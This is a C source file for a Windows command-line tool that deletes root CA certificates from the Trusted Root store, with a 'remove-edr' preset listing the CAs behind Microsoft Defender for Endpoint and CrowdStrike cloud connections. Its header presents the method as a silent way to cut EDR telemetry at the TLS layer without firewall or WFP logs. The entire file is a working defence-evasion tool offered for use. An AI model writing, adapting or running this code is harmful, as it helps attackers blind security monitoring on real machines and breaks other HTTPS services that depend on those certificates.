/*
 * 11_cert_store.c
 * Certificate Store Manipulation — break EDR TLS without touching the network
 *
 * Removes root CA certificates from the machine's Trusted Root CA store.
 * When the root CA for an EDR cloud endpoint is removed, TLS handshake fails
 * with certificate chain validation errors — connection is dropped at the
 * crypto layer before any network block is visible.
 *
 * This is silent: no WFP events, no firewall logs, no IPSec records.
 * The EDR's TLS library (schannel / openssl) reports a generic TLS error.
 *
 * Build:
 *   cl 11_cert_store.c /link Crypt32.lib Advapi32.lib
 *
 * Usage:
 *   11_cert_store.exe list [filter]      List certs in ROOT store (optional name filter)
 *   11_cert_store.exe remove <cn>        Remove cert by Common Name substring
 *   11_cert_store.exe backup <file>      Backup ROOT store to file
 *   11_cert_store.exe restore <file>     Restore certs from backup
 *
 * WARNING: Removing root CAs is highly disruptive. Every HTTPS service using
 * that CA will break — not just EDRs. Use sparingly and restore after.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Advapi32.lib")

/*
 * Microsoft Azure / MDE TLS chains typically root in:
 *   - "DigiCert Global Root G2"
 *   - "Microsoft RSA Root Certificate Authority 2017"
 *   - "Baltimore CyberTrust Root"
 *
 * CrowdStrike uses:
 *   - "DigiCert High Assurance EV Root CA"
 *
 * We keep a list for the 'remove-edr' preset command.
 */
static const WCHAR *EDR_ROOT_CAS[] = {
    L"DigiCert Global Root G2",
    L"DigiCert High Assurance EV Root CA",
    L"Microsoft RSA Root Certificate Authority 2017",
    NULL
};

/* Get CN string from certificate */
static void GetCertCN(PCCERT_CONTEXT pCert, WCHAR *out, DWORD outLen)
{
    CertGetNameStringW(pCert,
                       CERT_NAME_SIMPLE_DISPLAY_TYPE,
                       0, NULL, out, outLen);
}

/* Get issuer CN */
static void GetCertIssuer(PCCERT_CONTEXT pCert, WCHAR *out, DWORD outLen)
{
    CertGetNameStringW(pCert,
                       CERT_NAME_SIMPLE_DISPLAY_TYPE,
                       CERT_NAME_ISSUER_FLAG, NULL, out, outLen);
}

/* List all certs in ROOT store, optional substring filter */
static void ListCerts(const WCHAR *filter)
{
    HCERTSTORE hStore = CertOpenSystemStoreW(0, L"ROOT");
    if (!hStore) {
        wprintf(L"[-] Cannot open ROOT store: %lu\n", GetLastError());
        return;
    }

    PCCERT_CONTEXT pCert = NULL;
    DWORD count = 0;
    WCHAR cn[512];

    wprintf(L"%-5s  %-60s  Expires\n", L"#", L"Common Name");
    wprintf(L"%-5s  %-60s  -------\n", L"---", L"------------------------------------------------------------");

    while ((pCert = CertEnumCertificatesInStore(hStore, pCert)) != NULL) {
        GetCertCN(pCert, cn, ARRAYSIZE(cn));

        if (filter && !wcsstr(cn, filter)) continue;

        SYSTEMTIME st;
        FileTimeToSystemTime(&pCert->pCertInfo->NotAfter, &st);

        count++;
        wprintf(L"%-5lu  %-60s  %04d-%02d-%02d\n",
                count, cn, st.wYear, st.wMonth, st.wDay);
    }

    CertCloseStore(hStore, 0);
    wprintf(L"\n[*] Total: %lu certificate(s)\n", count);
}

/* Remove certs matching a CN substring — returns count removed */
static DWORD RemoveByCN(const WCHAR *cnSubstr, BOOL dryRun)
{
    HCERTSTORE hStore = CertOpenSystemStoreW(0, L"ROOT");
    if (!hStore) {
        wprintf(L"[-] Cannot open ROOT store: %lu\n", GetLastError());
        return 0;
    }

    DWORD removed = 0;
    PCCERT_CONTEXT pCert = NULL;
    PCCERT_CONTEXT pPrev = NULL;
    WCHAR cn[512];

    while ((pCert = CertEnumCertificatesInStore(hStore, pPrev)) != NULL) {
        GetCertCN(pCert, cn, ARRAYSIZE(cn));

        if (wcsstr(cn, cnSubstr)) {
            wprintf(L"  [%s] %s\n", dryRun ? L"DRY-RUN" : L"+", cn);

            if (!dryRun) {
                /* CertDeleteCertificateFromStore frees pCert — don't use it after */
                PCCERT_CONTEXT pDup = CertDuplicateCertificateContext(pCert);
                if (CertDeleteCertificateFromStore(pDup)) {
                    removed++;
                    /* Restart enum since we modified the store */
                    pPrev = NULL;
                    continue;
                } else {
                    wprintf(L"    [-] Delete failed: %lu\n", GetLastError());
                }
            } else {
                removed++;
            }
        }
        pPrev = pCert;
    }

    CertCloseStore(hStore, 0);
    return removed;
}

/* Backup ROOT store to a .cer / binary file */
static BOOL BackupStore(const WCHAR *filePath)
{
    HCERTSTORE hStore = CertOpenSystemStoreW(0, L"ROOT");
    if (!hStore) {
        wprintf(L"[-] Cannot open ROOT store\n");
        return FALSE;
    }

    /* Serialize entire store to memory, then write to file */
    HCERTSTORE hMem = CertOpenStore(
        CERT_STORE_PROV_MEMORY, 0, 0,
        CERT_STORE_CREATE_NEW_FLAG, NULL
    );

    PCCERT_CONTEXT pCert = NULL;
    DWORD count = 0;
    while ((pCert = CertEnumCertificatesInStore(hStore, pCert)) != NULL) {
        CertAddCertificateContextToStore(hMem, pCert,
                                         CERT_STORE_ADD_NEW, NULL);
        count++;
    }

    /* Save to PKCS7 file */
    BOOL ok = CertSaveStore(
        hMem,
        PKCS_7_ASN_ENCODING | X509_ASN_ENCODING,
        CERT_STORE_SAVE_AS_PKCS7,
        CERT_STORE_SAVE_TO_FILENAME_W,
        (void *)filePath, 0
    );

    CertCloseStore(hMem, 0);
    CertCloseStore(hStore, 0);

    if (ok) {
        wprintf(L"[+] Backed up %lu certificate(s) to: %s\n", count, filePath);
    } else {
        wprintf(L"[-] Backup failed: %lu\n", GetLastError());
    }
    return ok;
}

/* Restore certs from a PKCS7 backup file */
static BOOL RestoreStore(const WCHAR *filePath)
{
    HCERTSTORE hSrc = CertOpenStore(
        CERT_STORE_PROV_FILENAME_W,
        PKCS_7_ASN_ENCODING | X509_ASN_ENCODING,
        0, CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG,
        filePath
    );

    if (!hSrc) {
        wprintf(L"[-] Cannot open backup file: %lu\n", GetLastError());
        return FALSE;
    }

    HCERTSTORE hDst = CertOpenSystemStoreW(0, L"ROOT");
    if (!hDst) {
        CertCloseStore(hSrc, 0);
        return FALSE;
    }

    PCCERT_CONTEXT pCert = NULL;
    DWORD added = 0;
    while ((pCert = CertEnumCertificatesInStore(hSrc, pCert)) != NULL) {
        WCHAR cn[512] = {0};
        GetCertCN(pCert, cn, ARRAYSIZE(cn));

        if (CertAddCertificateContextToStore(hDst, pCert,
                                              CERT_STORE_ADD_REPLACE_EXISTING, NULL))
        {
            wprintf(L"  [+] Restored: %s\n", cn);
            added++;
        }
    }

    CertCloseStore(hSrc, 0);
    CertCloseStore(hDst, 0);

    wprintf(L"\n[+] Restored %lu certificate(s)\n", added);
    return TRUE;
}

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"[*] Certificate Store Manipulation Tool\n\n");

    if (argc < 2) {
        wprintf(L"Usage:\n");
        wprintf(L"  %s list [filter]      List ROOT store certs (optional name filter)\n", argv[0]);
        wprintf(L"  %s remove <cn>        Remove cert(s) matching CN substring\n", argv[0]);
        wprintf(L"  %s remove-edr         Remove well-known EDR root CAs\n", argv[0]);
        wprintf(L"  %s backup <file>      Backup ROOT store to PKCS7 file\n", argv[0]);
        wprintf(L"  %s restore <file>     Restore ROOT store from backup\n", argv[0]);
        return 1;
    }

    if (_wcsicmp(argv[1], L"list") == 0) {
        const WCHAR *filter = (argc >= 3) ? argv[2] : NULL;
        ListCerts(filter);
        return 0;
    }

    if (_wcsicmp(argv[1], L"remove") == 0) {
        if (argc < 3) {
            wprintf(L"[-] Specify a CN substring to match.\n");
            return 1;
        }
        DWORD n = RemoveByCN(argv[2], FALSE);
        wprintf(L"\n[+] Removed %lu certificate(s) matching: %s\n", n, argv[2]);
        if (n > 0) {
            wprintf(L"[!] WARNING: All HTTPS clients on this machine may fail for affected CAs.\n");
            wprintf(L"[!] Use 'restore <backup>' to recover.\n");
        }
        return 0;
    }

    if (_wcsicmp(argv[1], L"remove-edr") == 0) {
        wprintf(L"[*] Removing EDR root CAs...\n\n");
        DWORD total = 0;
        for (int i = 0; EDR_ROOT_CAS[i] != NULL; i++) {
            wprintf(L"[*] Searching: %s\n", EDR_ROOT_CAS[i]);
            total += RemoveByCN(EDR_ROOT_CAS[i], FALSE);
        }
        wprintf(L"\n[+] Removed %lu root CA(s).\n", total);
        return 0;
    }

    if (_wcsicmp(argv[1], L"backup") == 0) {
        if (argc < 3) { wprintf(L"[-] Specify output file path.\n"); return 1; }
        BackupStore(argv[2]);
        return 0;
    }

    if (_wcsicmp(argv[1], L"restore") == 0) {
        if (argc < 3) { wprintf(L"[-] Specify backup file path.\n"); return 1; }
        RestoreStore(argv[2]);
        return 0;
    }

    wprintf(L"[-] Unknown command: %s\n", argv[1]);
    return 1;
}
